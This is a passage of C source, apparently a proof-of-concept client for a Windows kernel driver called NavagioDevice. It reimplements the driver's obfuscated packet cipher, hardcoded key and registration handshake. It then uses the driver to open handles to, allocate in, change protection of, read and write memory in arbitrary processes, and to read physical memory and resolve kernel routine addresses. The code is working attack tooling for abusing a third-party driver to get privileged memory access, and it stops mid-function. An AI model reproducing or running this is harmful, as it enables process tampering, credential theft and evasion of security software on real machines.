#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <windows.h>
#include <bcrypt.h>
#include <intrin.h>
#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <wctype.h>

#ifdef _MSC_VER
#pragma comment(lib, "bcrypt.lib")
#endif

#define MAX_TRANSFER (64u * 1024u * 1024u)

#define NAVAGIO_IOCTL_NOTIFY 0x222140u
#define NAVAGIO_IOCTL_REQUEST 0x223004u
#define NAVAGIO_PACKET_SIZE 0x298u
#define NAVAGIO_NOTIFY_SIZE 0x50u
#define NAVAGIO_INITIAL_KEY 0x38e748f4c5211deeull

#define NAVAGIO_CMD_REGISTER 0xad4u
#define NAVAGIO_CMD_NEXT_EVENT 0xad6u
#define NAVAGIO_CMD_NVXE_CONFIGURE 0xad7u
#define NAVAGIO_CMD_NVXE_CLEAR 0xad8u
#define NAVAGIO_CMD_PROCESS_RECORDS 0xad9u
#define NAVAGIO_CMD_OPEN_PROCESS 0xadau
#define NAVAGIO_CMD_IMAGE_RECORDS 0xadbu
#define NAVAGIO_CMD_IMAGE_RECORD_BY_NAME 0xadcu
#define NAVAGIO_CMD_READ_MEMORY_PHYSICAL 0xadeu
#define NAVAGIO_CMD_PING 0xae0u
#define NAVAGIO_CMD_SCAN_MEMORY 0xae1u
#define NAVAGIO_CMD_SCAN_IMAGE 0xae3u
#define NAVAGIO_CMD_SYSTEM_ROUTINE 0xae4u
#define NAVAGIO_CMD_INSPECT_PAGES 0xae5u
#define NAVAGIO_CMD_INITIALIZE_FEATURES 0xae6u
#define NAVAGIO_CMD_OPEN_PROCESS_ATTACHED 0xae7u
#define NAVAGIO_CMD_READ_PHYSICAL 0xae8u
#define NAVAGIO_CMD_SCAN_PHYSICAL 0xae9u
#define NAVAGIO_CMD_CACHE_DWM 0xaeau
#define NAVAGIO_CMD_ALLOCATE_MEMORY 0xaebu
#define NAVAGIO_CMD_FREE_MEMORY 0xaecu
#define NAVAGIO_CMD_QUERY_MEMORY 0xaedu
#define NAVAGIO_CMD_READ_MEMORY 0xaeeu
#define NAVAGIO_CMD_WRITE_MEMORY 0xaefu
#define NAVAGIO_CMD_PROTECT_MEMORY 0xaf0u
#define NAVAGIO_CMD_PROCESS_INFO 0xaf1u
#define NAVAGIO_CMD_PROCESS_IDS 0xaf2u
#define NAVAGIO_CMD_VERSION 0xaf3u
#define NAVAGIO_CMD_BUS_CONFIGS 0xaf4u
#define NAVAGIO_CMD_NMI_RECORDS 0xaf5u

enum {
    NAVAGIO_OFF_IV = 0x00,
    NAVAGIO_OFF_COMMAND = 0x10,
    NAVAGIO_OFF_SESSION = 0x14,
    NAVAGIO_OFF_CHALLENGE = 0x1c,
    NAVAGIO_OFF_SUCCESS = 0x20,
    NAVAGIO_OFF_NEW_KEY = 0xa8
};

typedef struct navagio_packet {
    uint8_t bytes[NAVAGIO_PACKET_SIZE];
} navagio_packet;


#define NAVAGIO_DEVICE_PATH L"\\\\.\\NavagioDevice"

typedef struct poc {
    HANDLE device;
    uint64_t key;
    uint32_t session;
    uint32_t process_id;
    uint32_t last_driver_status;
    int32_t last_ntstatus;
} poc;


typedef struct navagio_version {
    uint32_t family;
    uint32_t revision;
} navagio_version;


typedef struct navagio_process_info {
    uint64_t encoded_process_object;
    uint64_t process_object;
    uint32_t pid;
    uint32_t parent_pid;
    uint64_t creation_time;
    uint64_t peb;
    uint64_t reserved0;
    uint64_t reserved1;
    uint32_t attributes;
    uint8_t metadata;
    uint8_t reserved2;
    wchar_t image_path[260];
} navagio_process_info;


typedef struct navagio_event {
    uint32_t type;
    uint32_t fields[4];
    uint8_t data[4096];
} navagio_event;


typedef struct navagio_bus_config {
    uint8_t data[4096];
    uint64_t returned;
} navagio_bus_config;


typedef struct navagio_image_record {
    uint64_t base;
    uint64_t size;
    uint32_t field10;
    uint32_t reserved;
    uint64_t field18;
    uint32_t attributes;
    wchar_t name[261];
    wchar_t path[261];
} navagio_image_record;


typedef struct navagio_nmi_record {
    uint64_t words[0x280 / 8];
} navagio_nmi_record;


typedef struct navagio_scan_record {
    uint64_t words[10];
} navagio_scan_record;

typedef struct navagio_scan_options {
    uint8_t pattern[64];
    uint32_t pattern_size;
    uint8_t match_byte;
    uint8_t mode;
    uint8_t process_mode;
    uint8_t match_mode;
    uint32_t parameter;
    uint64_t process_identifier;
    uint32_t pid;
} navagio_scan_options;


#define LCG_MULTIPLIER 0x5851f42d4c957f2dull
#define LCG_MODULUS 0xfffffffffffffff0ull

static uint32_t navagio_get_u32(const void* data) {
    uint32_t value;

    memcpy(&value, data, sizeof(value));
    return value;
}


static uint64_t navagio_get_u64(const void* data) {
    uint64_t value;

    memcpy(&value, data, sizeof(value));
    return value;
}


static void navagio_put_u32(void* data, uint32_t value) {
    memcpy(data, &value, sizeof(value));
}


static void navagio_put_u64(void* data, uint64_t value) {
    memcpy(data, &value, sizeof(value));
}


static uint64_t rotate_left(uint64_t x, unsigned int bits) {
    return (x << bits) | (x >> (64u - bits));
}


static uint64_t lcg(uint64_t x) {
    return (x * LCG_MULTIPLIER + 1u) % LCG_MODULUS;
}


static uint64_t mix(uint64_t x) {
    uint64_t y = x ^ (x << 32);
    uint64_t z = ((y >> 9) & 0x7ff80000000000ull) | (y & 0x7e000000000ull);

    z = (z >> 7) | (x & 0x3fc00000ull);
    z = (z >> 5) | (y & 0xff80000000000ull);
    z >>= 14;
    return z | ((((x & 0x3ffff8ull) << 8) | (y & 0xffffffffc0000000ull)) << 27) | (x & 7u);
}


static void transform(uint8_t* data, size_t size, uint64_t state, int decrypt) {
    uint64_t previous = 0;
    size_t offset;

    for (offset = 8; offset < size; offset += 8) {
        uint64_t before = navagio_get_u64(data + offset);
        uint64_t after = before ^ mix(state ^ previous ^ 0xb4a643c5df1a334cull);
        navagio_put_u64(data + offset, after);
        previous = decrypt ? before : after;
        state = rotate_left(lcg(state) ^ 0x10f13fa8ull, 28);
    }
}


static void navagio_encode(navagio_packet* packet, uint64_t key) {
    transform(packet->bytes, sizeof(packet->bytes), ~(navagio_get_u64(packet->bytes) ^ key), 0);
}


static void navagio_decode(navagio_packet* packet, uint64_t key) {
    transform(packet->bytes, sizeof(packet->bytes), ~(navagio_get_u64(packet->bytes) ^ key), 1);
}


static void navagio_encode_notify(uint8_t packet[NAVAGIO_NOTIFY_SIZE]) {
    transform(packet, NAVAGIO_NOTIFY_SIZE, navagio_get_u64(packet) ^ 0x54b85cc598aabfcbull, 0);
}


static uint32_t navagio_challenge_response(uint32_t challenge) {
    uint32_t first = (challenge * 0x08088405u + 1u) % 0xfffffff0u;
    uint32_t second = (first * 0x08088405u + 1u) % 0xfffffff0u;

    return ~(second ^ (challenge >> 3));
}


static uint64_t handshake_mix(uint64_t value) {
    return (value << 4) ^ (value >> 38);
}


static void navagio_make_registration(navagio_packet* packet, uint32_t pid, uint32_t timestamp_high) {
    uint64_t a = 0, b = 0;
    size_t offset = 0x48;
    unsigned int iteration;

    memset(packet, 0, sizeof(*packet));
    navagio_put_u32(packet->bytes + NAVAGIO_OFF_COMMAND, NAVAGIO_CMD_REGISTER);
    navagio_put_u64(packet->bytes + 0x30, 0xf368dfb59d3694e0ull);
    a = lcg(a);
    b = lcg(b);
    for (iteration = 1; iteration <= 3; ++iteration) {
        size_t divisor = ((0x98u - offset) / 8u) / (4u - iteration) - 1u;
        size_t index = (size_t)(b % divisor);
        size_t next = offset + 16u + 8u * index;
        navagio_put_u64(packet->bytes + offset, handshake_mix(a) ^ index);
        a = lcg(a);
        b = lcg(b);
        navagio_put_u64(packet->bytes + offset + 8u, a ^ b ^ (iteration == 3 ? pid : 0u));
        offset = next;
    }
    a = lcg(a);
    navagio_put_u64(packet->bytes + offset, a ^ timestamp_high);

    navagio_put_u64(packet->bytes + 0x28, navagio_get_u64(packet->bytes + 0x78) ^ 0x7172ef800d35b811ull);
}


static int is_open(const poc* client) {
    return client && client->device && client->device != INVALID_HANDLE_VALUE;
}


static DWORD random_bytes(void* data, ULONG size) {
    NTSTATUS status = BCryptGenRandom(NULL, (PUCHAR)data, size, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    return status >= 0 ? ERROR_SUCCESS : ERROR_GEN_FAILURE;
}


static DWORD navagio_open(poc* client, const wchar_t* device_path) {
    if (!client) {
        return ERROR_INVALID_PARAMETER;
    }
    memset(client, 0, sizeof(*client));
    client->last_driver_status = UINT32_MAX;
    client->device = CreateFileW(device_path ? device_path : NAVAGIO_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (client->device == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }
    client->key = NAVAGIO_INITIAL_KEY;
    client->process_id = GetCurrentProcessId();
    return ERROR_SUCCESS;
}


static DWORD navagio_close(poc* client) {
    if (!client) {
        return ERROR_INVALID_PARAMETER;
    }
    if (is_open(client) && !CloseHandle(client->device)) {
        return GetLastError();
    }
    SecureZeroMemory(client, sizeof(*client));
    client->device = INVALID_HANDLE_VALUE;
    return ERROR_SUCCESS;
}


static DWORD exchange_packet(poc* client, navagio_packet* packet, uint32_t* sent_challenge) {
    navagio_packet wire;
    uint8_t entropy[12];
    DWORD returned = 0;
    DWORD error;

    if (!is_open(client) || !packet) {
        return ERROR_INVALID_PARAMETER;
    }
    error = random_bytes(entropy, (ULONG)sizeof(entropy));
    if (error) {
        return error;
    }
    *sent_challenge = navagio_get_u32(entropy + 8);
    navagio_put_u64(packet->bytes + NAVAGIO_OFF_IV, navagio_get_u64(entropy));
    navagio_put_u32(packet->bytes + NAVAGIO_OFF_SESSION, client->session);
    navagio_put_u32(packet->bytes + NAVAGIO_OFF_CHALLENGE, *sent_challenge);
    navagio_put_u32(packet->bytes + NAVAGIO_OFF_SUCCESS, 0);
    wire = *packet;
    navagio_encode(&wire, client->key);

    if (!DeviceIoControl(client->device, NAVAGIO_IOCTL_REQUEST, &wire, (DWORD)sizeof(wire), &wire, (DWORD)sizeof(wire), &returned, NULL)) {
        error = GetLastError();
        SecureZeroMemory(&wire, sizeof(wire));
        return error;
    }
    if (returned != sizeof(wire)) {
        SecureZeroMemory(&wire, sizeof(wire));
        return ERROR_BAD_LENGTH;
    }
    navagio_decode(&wire, client->key);
    *packet = wire;
    SecureZeroMemory(&wire, sizeof(wire));
    return ERROR_SUCCESS;
}


static int valid_reply(const navagio_packet* packet, uint32_t command, uint32_t challenge) {
    return navagio_get_u32(packet->bytes + NAVAGIO_OFF_COMMAND) == command && navagio_get_u32(packet->bytes + NAVAGIO_OFF_SUCCESS) == 1u &&
        navagio_get_u32(packet->bytes + NAVAGIO_OFF_CHALLENGE) == navagio_challenge_response(challenge);
}


static DWORD navagio_register(poc* client) {
    navagio_packet packet;
    uint32_t challenge, session;
    DWORD error;

    if (!is_open(client)) {
        return ERROR_INVALID_HANDLE;
    }
    if (client->session) {
        return ERROR_ALREADY_INITIALIZED;
    }
    navagio_make_registration(&packet, client->process_id, (uint32_t)(__rdtsc() >> 32));
    error = exchange_packet(client, &packet, &challenge);
    if (!error) {
        session = navagio_get_u32(packet.bytes + NAVAGIO_OFF_SESSION);
        if (!valid_reply(&packet, NAVAGIO_CMD_REGISTER, challenge) || !session || (session & (session - 1u))) {
            error = ERROR_INVALID_DATA;
        }
        else {
            client->session = session;
            client->key = navagio_get_u64(packet.bytes + NAVAGIO_OFF_NEW_KEY);
        }
    }
    SecureZeroMemory(&packet, sizeof(packet));
    return error;
}


static DWORD navagio_ping(poc* client, uint32_t* challenge, uint32_t* response) {
    navagio_packet packet = { {0} };
    uint32_t sent;
    DWORD error;

    if (!is_open(client) || !client->session) {
        return ERROR_INVALID_STATE;
    }
    navagio_put_u32(packet.bytes + NAVAGIO_OFF_COMMAND, NAVAGIO_CMD_PING);
    error = exchange_packet(client, &packet, &sent);
    if (!error && (!valid_reply(&packet, NAVAGIO_CMD_PING, sent) || navagio_get_u32(packet.bytes + NAVAGIO_OFF_SESSION) != client->session)) {
        error = ERROR_INVALID_DATA;
    }
    if (!error) {
        if (challenge) {
            *challenge = sent;
        }
        if (response) {
            *response = navagio_get_u32(packet.bytes + NAVAGIO_OFF_CHALLENGE);
        }
    }
    SecureZeroMemory(&packet, sizeof(packet));
    return error;
}


static DWORD navagio_exchange(poc* client, navagio_packet* packet) {
    uint32_t challenge;

    if (!is_open(client) || !client->session || !packet) {
        return ERROR_INVALID_PARAMETER;
    }
    if (navagio_get_u32(packet->bytes + NAVAGIO_OFF_COMMAND) == NAVAGIO_CMD_REGISTER) {
        return ERROR_INVALID_FUNCTION;
    }
    return exchange_packet(client, packet, &challenge);
}


static DWORD navagio_command(poc* client, navagio_packet* packet) {
    uint32_t challenge, command;
    DWORD error;

    if (client) {
        client->last_driver_status = UINT32_MAX;
        client->last_ntstatus = 0;
    }
    if (!is_open(client) || !client->session || !packet) {
        return ERROR_INVALID_PARAMETER;
    }
    command = navagio_get_u32(packet->bytes + NAVAGIO_OFF_COMMAND);
    if (command == NAVAGIO_CMD_REGISTER) {
        return ERROR_INVALID_FUNCTION;
    }
    error = exchange_packet(client, packet, &challenge);
    if (error) {
        return error;
    }
    if (navagio_get_u32(packet->bytes + NAVAGIO_OFF_COMMAND) != command || navagio_get_u32(packet->bytes + NAVAGIO_OFF_SESSION) != client->session ||
        navagio_get_u32(packet->bytes + NAVAGIO_OFF_CHALLENGE) != navagio_challenge_response(challenge)) {
        return ERROR_INVALID_DATA;
    }
    client->last_driver_status = navagio_get_u32(packet->bytes + NAVAGIO_OFF_SUCCESS);
    switch (client->last_driver_status) {
    case 1:
        return ERROR_SUCCESS;
    case 5:
        return ERROR_NOACCESS;
    case 6:
        return ERROR_NO_MORE_ITEMS;
    case 7:
        return ERROR_NOT_ENOUGH_MEMORY;
    case 8:
        return ERROR_INSUFFICIENT_BUFFER;
    case 9:
        return ERROR_INVALID_PARAMETER;
    case 13:
        return ERROR_NOT_SUPPORTED;
    default:
        return ERROR_GEN_FAILURE;
    }
}


static DWORD notify_packet(poc* client, uint32_t command, uint32_t pid) {
    uint8_t packet[NAVAGIO_NOTIFY_SIZE] = { 0 };
    DWORD returned = 0;
    DWORD error;
    size_t i;

    if (!is_open(client)) {
        return ERROR_INVALID_HANDLE;
    }
    error = random_bytes(packet, 8);
    if (error) {
        return error;
    }
    navagio_put_u32(packet + 8, command);
    navagio_put_u32(packet + 12, pid);
    navagio_encode_notify(packet);
    if (!DeviceIoControl(client->device, NAVAGIO_IOCTL_NOTIFY, packet, (DWORD)sizeof(packet), packet, (DWORD)sizeof(packet), &returned, NULL)) {
        return GetLastError();
    }
    if (returned != sizeof(packet)) {
        return ERROR_BAD_LENGTH;
    }
    for (i = 0; i < sizeof(packet); ++i) {
        if (packet[i] != 0) {
            return ERROR_INVALID_DATA;
        }
    }
    return ERROR_SUCCESS;
}

static DWORD navagio_notify_process(poc* client, uint32_t pid) {
    if (!pid) {
        return ERROR_INVALID_PARAMETER;
    }
    return notify_packet(client, 1, pid);
}


static_assert(sizeof(navagio_process_info) == 0x248, "process record size");
static_assert(offsetof(navagio_process_info, image_path) == 0x3e, "process path offset");

static void initialize(navagio_packet* packet, uint32_t command) {
    memset(packet, 0, sizeof(*packet));
    navagio_put_u32(packet->bytes + NAVAGIO_OFF_COMMAND, command);
}


static void target(navagio_packet* packet, uint32_t pid) {
    navagio_put_u32(packet->bytes + 0x38, pid);
}


static DWORD native_result(poc* client, navagio_packet* packet, DWORD error) {
    if (client && client->last_driver_status != UINT32_MAX) {
        client->last_ntstatus = (int32_t)navagio_get_u32(packet->bytes + 0x28);
    }
    return error;
}


static DWORD navagio_get_version(poc* client, navagio_version* version) {
    navagio_packet packet;
    DWORD error;

    if (!version) {
        return ERROR_INVALID_PARAMETER;
    }
    memset(version, 0, sizeof(*version));
    initialize(&packet, NAVAGIO_CMD_VERSION);
    error = navagio_command(client, &packet);
    if (!error) {
        version->family = navagio_get_u32(packet.bytes + 0x28);
        version->revision = navagio_get_u32(packet.bytes + 0x2c);
    }
    return error;
}


static DWORD navagio_open_process(poc* client, uint32_t pid, int attach_method, HANDLE* process) {
    navagio_packet packet;
    DWORD error;

    if (!pid || !process || (attach_method != 0 && attach_method != 1)) {
        return ERROR_INVALID_PARAMETER;
    }
    *process = NULL;
    initialize(&packet, attach_method ? NAVAGIO_CMD_OPEN_PROCESS_ATTACHED : NAVAGIO_CMD_OPEN_PROCESS);
    navagio_put_u32(packet.bytes + 0x30, pid);
    error = navagio_command(client, &packet);
    if (!error) {
        HANDLE handle = (HANDLE)(uintptr_t)navagio_get_u64(packet.bytes + 0x38);
        if (!handle || handle == INVALID_HANDLE_VALUE) {
            return ERROR_INVALID_DATA;
        }
        *process = handle;
    }
    return error;
}


static DWORD navagio_allocate_memory(poc* client, uint32_t pid, uint64_t* address, size_t* size, uint32_t allocation_type, uint32_t protection) {
    navagio_packet packet;
    DWORD error;

    if (!pid || !address || !size || !*size) {
        return ERROR_INVALID_PARAMETER;
    }
    initialize(&packet, NAVAGIO_CMD_ALLOCATE_MEMORY);
    target(&packet, pid);
    navagio_put_u64(packet.bytes + 0x40, *address);
    navagio_put_u64(packet.bytes + 0x50, *size);
    navagio_put_u32(packet.bytes + 0x58, allocation_type);
    navagio_put_u32(packet.bytes + 0x5c, protection);
    error = native_result(client, &packet, navagio_command(client, &packet));
    if (!error) {
        *address = navagio_get_u64(packet.bytes + 0x40);
        *size = (size_t)navagio_get_u64(packet.bytes + 0x50);
    }
    return error;
}


static DWORD navagio_free_memory(poc* client, uint32_t pid, uint64_t* address, size_t* size, uint32_t free_type) {
    navagio_packet packet;
    DWORD error;

    if (!pid || !address || !*address || !size) {
        return ERROR_INVALID_PARAMETER;
    }
    if (free_type == MEM_RELEASE && *size != 0) {
        return ERROR_INVALID_PARAMETER;
    }
    initialize(&packet, NAVAGIO_CMD_FREE_MEMORY);
    target(&packet, pid);
    navagio_put_u64(packet.bytes + 0x40, *address);
    navagio_put_u64(packet.bytes + 0x48, *size);
    navagio_put_u32(packet.bytes + 0x50, free_type);
    error = native_result(client, &packet, navagio_command(client, &packet));
    if (!error) {
        *address = navagio_get_u64(packet.bytes + 0x40);
        *size = (size_t)navagio_get_u64(packet.bytes + 0x48);
    }
    return error;
}


static DWORD navagio_protect_memory(poc* client, uint32_t pid, uint64_t* address, size_t* size, uint32_t protection, uint32_t* old_protection) {
    navagio_packet packet;
    DWORD error;

    if (!pid || !address || !*address || !size || !*size || !old_protection) {
        return ERROR_INVALID_PARAMETER;
    }
    *old_protection = 0;
    initialize(&packet, NAVAGIO_CMD_PROTECT_MEMORY);
    target(&packet, pid);
    navagio_put_u64(packet.bytes + 0x40, *address);
    navagio_put_u64(packet.bytes + 0x48, *size);
    navagio_put_u32(packet.bytes + 0x50, protection);
    error = native_result(client, &packet, navagio_command(client, &packet));
    if (!error) {
        *address = navagio_get_u64(packet.bytes + 0x40);
        *size = (size_t)navagio_get_u64(packet.bytes + 0x48);
        *old_protection = navagio_get_u32(packet.bytes + 0x54);
    }
    return error;
}


static DWORD navagio_query_memory(poc* client, uint32_t pid, uint64_t address, MEMORY_BASIC_INFORMATION* information) {
    navagio_packet packet;
    DWORD error;
    uint64_t returned;

    if (!pid || !information) {
        return ERROR_INVALID_PARAMETER;
    }
    memset(information, 0, sizeof(*information));
    initialize(&packet, NAVAGIO_CMD_QUERY_MEMORY);
    target(&packet, pid);
    navagio_put_u64(packet.bytes + 0x40, address);
    navagio_put_u32(packet.bytes + 0x48, 0);
    navagio_put_u64(packet.bytes + 0x50, (uintptr_t)information);
    navagio_put_u64(packet.bytes + 0x58, sizeof(*information));
    error = native_result(client, &packet, navagio_command(client, &packet));
    if (error) {
        return error;
    }
    returned = navagio_get_u64(packet.bytes + 0x60);
    return returned == sizeof(*information) ? ERROR_SUCCESS : ERROR_BAD_LENGTH;
}


static DWORD transfer(poc* client, uint32_t command, uint32_t pid, uint64_t address, const void* buffer, size_t size, size_t* transferred) {
    navagio_packet packet;
    DWORD error;
    uint64_t done;

    if (transferred) {
        *transferred = 0;
    }
    if (!pid || !address || !buffer || !size || size > MAX_TRANSFER || address > UINT64_MAX - (size - 1u)) {
        return ERROR_INVALID_PARAMETER;
    }
    initialize(&packet, command);
    target(&packet, pid);
    navagio_put_u64(packet.bytes + 0x40, address);
    navagio_put_u64(packet.bytes + 0x48, (uintptr_t)buffer);
    navagio_put_u64(packet.bytes + 0x50, size);
    error = navagio_command(client, &packet);
    if (error) {
        return error;
    }
    done = navagio_get_u64(packet.bytes + 0x58);
    if (done > size) {
        return ERROR_INVALID_DATA;
    }
    if (transferred) {
        *transferred = (size_t)done;
    }
    return done == size ? ERROR_SUCCESS : ERROR_PARTIAL_COPY;
}


static DWORD navagio_read_memory(poc* client, uint32_t pid, uint64_t address, void* buffer, size_t size, size_t* transferred) {
    return transfer(client, NAVAGIO_CMD_READ_MEMORY, pid, address, buffer, size, transferred);
}


static DWORD navagio_write_memory(poc* client, uint32_t pid, uint64_t address, const void* buffer, size_t size, size_t* transferred) {
    return transfer(client, NAVAGIO_CMD_WRITE_MEMORY, pid, address, buffer, size, transferred);
}


static DWORD navagio_get_process_ids(poc* client, uint64_t* identifiers, uint32_t* count) {
    navagio_packet packet;
    DWORD error;
    uint32_t capacity;

    if (!count || (*count && !identifiers) || *count > 1048576u) {
        return ERROR_INVALID_PARAMETER;
    }
    capacity = *count;
    initialize(&packet, NAVAGIO_CMD_PROCESS_IDS);
    navagio_put_u32(packet.bytes + 0x28, capacity);
    navagio_put_u64(packet.bytes + 0x30, (uintptr_t)identifiers);
    error = navagio_command(client, &packet);
    if (!error || error == ERROR_INSUFFICIENT_BUFFER) {
        *count = navagio_get_u32(packet.bytes + 0x28);
        if (!error && *count > capacity) {
            return ERROR_INVALID_DATA;
        }
    }
    if (error == ERROR_NO_MORE_ITEMS) {
        *count = 0;
    }
    return error;
}


static DWORD process_info(poc* client, uint32_t pid, uint64_t identifier, navagio_process_info* information) {
    navagio_packet packet;
    DWORD error;

    if ((!pid && !identifier) || !information) {
        return ERROR_INVALID_PARAMETER;
    }
    memset(information, 0, sizeof(*information));
    initialize(&packet, NAVAGIO_CMD_PROCESS_INFO);
    navagio_put_u64(packet.bytes + 0x28, identifier);
    navagio_put_u32(packet.bytes + 0x30, pid);
    navagio_put_u64(packet.bytes + 0x38, (uintptr_t)information);
    error = navagio_command(client, &packet);
    if (!error && (!information->pid || (pid && information->pid != pid))) {
        return ERROR_INVALID_DATA;
    }
    information->image_path[259] = L'\0';
    return error;
}


static DWORD navagio_get_process_info(poc* client, uint32_t pid, navagio_process_info* information) {
    return process_info(client, pid, 0, information);
}


static DWORD navagio_get_process_info_by_id(poc* client, uint64_t identifier, navagio_process_info* information) {
    return process_info(client, 0, identifier, information);
}


static DWORD navagio_get_process_records(poc* client, navagio_process_info* records, uint32_t* count) {
    navagio_packet packet;
    DWORD error;
    uint32_t capacity, i;

    if (!count || (*count && !records) || *count > 16384u) {
        return ERROR_INVALID_PARAMETER;
    }
    capacity = *count;
    initialize(&packet, NAVAGIO_CMD_PROCESS_RECORDS);
    navagio_put_u32(packet.bytes + 0x28, capacity);
    navagio_put_u64(packet.bytes + 0x30, (uintptr_t)records);
    error = navagio_command(client, &packet);
    if (!error || error == ERROR_INSUFFICIENT_BUFFER) {
        *count = navagio_get_u32(packet.bytes + 0x28);
        if (!error && *count > capacity) {
            return ERROR_INVALID_DATA;
        }
    }
    if (error == ERROR_NO_MORE_ITEMS) {
        *count = 0;
    }
    if (!error) {
        for (i = 0; i < *count; ++i) {
            records[i].image_path[259] = L'\0';
        }
    }
    return error;
}


static DWORD navagio_system_routine(poc* client, const wchar_t* name, uint64_t* address) {
    navagio_packet packet;
    DWORD error;
    size_t length;

    if (!name || !address) {
        return ERROR_INVALID_PARAMETER;
    }
    *address = 0;
    length = wcsnlen_s(name, 80);
    if (!length || length >= 80) {
        return ERROR_INVALID_PARAMETER;
    }
    initialize(&packet, NAVAGIO_CMD_SYSTEM_ROUTINE);
    memcpy(packet.bytes + 0x28, name, (length + 1u) * sizeof(*name));
    error = navagio_command(client, &packet);
    if (!error) {
        *address = navagio_get_u64(packet.bytes + 0xc8);
        if (!*address) {
            return ERROR_PROC_NOT_FOUND;
        }
    }
    return error;
}


#define NVXE_MAGIC 0x4e565845u

static_assert(sizeof(navagio_bus_config) == 0x1008, "bus configuration record size");
static_assert(sizeof(navagio_image_record) == 0x438, "image record size");
static_assert(offsetof(navagio_image_record, name) == 0x24, "image name offset");
static_assert(offsetof(navagio_image_record, path) == 0x22e, "image path offset");
static_assert(sizeof(navagio_nmi_record) == 0x280, "NMI record size");
static_assert(sizeof(navagio_scan_record) == 0x50, "scan record size");

static void initialize_extra(navagio_packet* packet, uint32_t command) {
    memset(packet, 0, sizeof(*packet));
    navagio_put_u32(packet->bytes + NAVAGIO_OFF_COMMAND, command);
}


static DWORD navagio_next_event(poc* client, uint32_t filter, navagio_event* event) {
    navagio_packet packet;
    DWORD error;

    if (!event || filter > 2) {
        return ERROR_INVALID_PARAMETER;
    }
    memset(event, 0, sizeof(*event));
    initialize_extra(&packet, NAVAGIO_CMD_NEXT_EVENT);
    navagio_put_u32(packet.bytes + 0x28, filter);
    navagio_put_u64(packet.bytes + 0x40, (uintptr_t)event->data);
    error = navagio_command(client, &packet);
    if (!error) {
        event->type = navagio_get_u32(packet.bytes + 0x28);
        memcpy(event->fields, packet.bytes + 0x30, sizeof(event->fields));
        if (event->type < 1 || event->type > 2 || (filter && event->type != filter)) {
            return ERROR_INVALID_DATA;
        }
    }
    return error;
}


static DWORD navagio_initialize_features(poc* client, const uint32_t* ids, uint32_t count) {
    navagio_packet packet;
    uint32_t i;

    if (count > 8 || (count && !ids)) {
        return ERROR_INVALID_PARAMETER;
    }
    for (i = 0; i < count; ++i) {
        if (ids[i] != 100 && ids[i] != 101 && ids[i] != 105 && ids[i] != 106 && ids[i] != 107 && ids[i] != 999) {
            return ERROR_INVALID_PARAMETER;
        }
    }
    initialize_extra(&packet, NAVAGIO_CMD_INITIALIZE_FEATURES);
    navagio_put_u32(packet.bytes + 0x28, count);
    if (count) {
        memcpy(packet.bytes + 0x2c, ids, count * sizeof(*ids));
    }
    return navagio_command(client, &packet);
}


static DWORD navagio_read_physical(poc* client, uint64_t address, void* buffer, size_t size) {
    navagio_packet packet;

    if (!buffer || !size || size > MAX_TRANSFER || address > UINT64_MAX - (size - 1u)) {
        return ERROR_INVALID_PARAMETER;
    }
    initialize_extra(&packet, NAVAGIO_CMD_READ_PHYSICAL);
    navagio_put_u64(packet.bytes + 0x28, (uintptr_t)buffer);
    navagio_put_u64(packet.bytes + 0x30, address);
    navagio_put_u64(packet.bytes + 0x38, size);
    return navagio_command(client, &packet);
}


static DWORD navagio_get_bus_configs(poc* client, navagio_bus_config* records, uint32_t* count, uint32_t* examined) {
    navagio_packet packet;
    uint32_t capacity, i;
    DWORD error;

    if (!count || *count > 4096 || (*count && !records)) {
        return ERROR_INVALID_PARAMETER;
    }
    capacity = *count;
    if (examined) {
        *examined = 0;
    }
    initialize_extra(&packet, NAVAGIO_CMD_BUS_CONFIGS);
    navagio_put_u32(packet.bytes + 0x2c, capacity);
    navagio_put_u64(packet.bytes + 0x30, (uintptr_t)records);
    error = navagio_command(client, &packet);
    if (!error || error == ERROR_INSUFFICIENT_BUFFER) {
        *count = navagio_get_u32(packet.bytes + 0x2c);
        if (examined) {
            *examined = navagio_get_u32(packet.bytes + 0x28);
        }
        if (!error && *count > capacity) {
            return ERROR_INVALID_DATA;
        }
    }
    if (!error) {
        for (i = 0; i < *count; ++i) {
            if (records[i].returned > sizeof(records[i].data)) {
                return ERROR_INVALID_DATA;
            }
        }
    }
    return error;
}


static DWORD navagio_nvxe_configure(poc* client, uint32_t pid, uint64_t parameter, const void* configuration, size_t configuration_size, const void* auxiliary, size_t auxiliary_size) {
    navagio_packet packet;
    DWORD error;

    if (!pid || !configuration || configuration_size < 32 || configuration_size > MAX_TRANSFER || auxiliary_size > MAX_TRANSFER || (auxiliary_size && !auxiliary)) {
        return ERROR_INVALID_PARAMETER;
    }
    initialize_extra(&packet, NAVAGIO_CMD_NVXE_CONFIGURE);
    navagio_put_u32(packet.bytes + 0x28, NVXE_MAGIC);
    navagio_put_u32(packet.bytes + 0x30, pid);
    navagio_put_u64(packet.bytes + 0x38, parameter);
    navagio_put_u64(packet.bytes + 0x40, configuration_size);
    navagio_put_u64(packet.bytes + 0x48, (uintptr_t)configuration);
    navagio_put_u64(packet.bytes + 0x50, auxiliary_size);
    navagio_put_u64(packet.bytes + 0x58, (uintptr_t)auxiliary);
    error = navagio_command(client, &packet);
    if (!error && navagio_get_u64(packet.bytes + 0x50) != auxiliary_size) {
        return ERROR_PARTIAL_COPY;
    }
    return error;
}


static DWORD navagio_nvxe_clear(poc* client) {
    navagio_packet packet;

    initialize_extra(&packet, NAVAGIO_CMD_NVXE_CLEAR);
    navagio_put_u32(packet.bytes + 0x28, NVXE_MAGIC);
    return navagio_command(client, &packet);
}


static DWORD navagio_read_memory_physical(poc* client, uint32_t pid, uint64_t address, void* buffer, size_t size) {
    navagio_packet packet;

    if (!pid || !address || !buffer || !size || size > MAX_TRANSFER || address > UINT64_MAX - (size - 1u)) {
        return ERROR_INVALID_PARAMETER;
    }
    initialize_extra(&packet, NAVAGIO_CMD_READ_MEMORY_PHYSICAL);
